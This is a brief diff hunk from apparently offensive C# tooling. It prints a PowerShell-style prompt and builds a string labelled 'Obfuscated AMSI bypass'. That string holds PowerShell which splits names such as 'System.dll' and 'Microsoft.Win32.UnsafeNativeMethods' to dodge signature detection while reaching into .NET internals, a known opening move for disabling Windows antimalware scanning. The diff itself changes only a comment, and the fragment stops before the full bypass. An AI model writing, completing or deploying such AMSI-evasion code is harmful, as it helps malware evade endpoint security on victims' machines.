@@ -53,7 +53,7 @@
 
                 Console.WriteLine("PS " + y2 + ">");
 
-                // Obfuscated AMSI bypass (PowerShell, no ETW)
+                // Obfuscated AMSI bypass
                 string amsiBypass = @"
                     $x1 = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys' + 'tem.dll')) }
                     $y2 = $x1.GetType(('Micro' + 'soft.Win' + '32.Unsafe' + 'NativeMethods'))
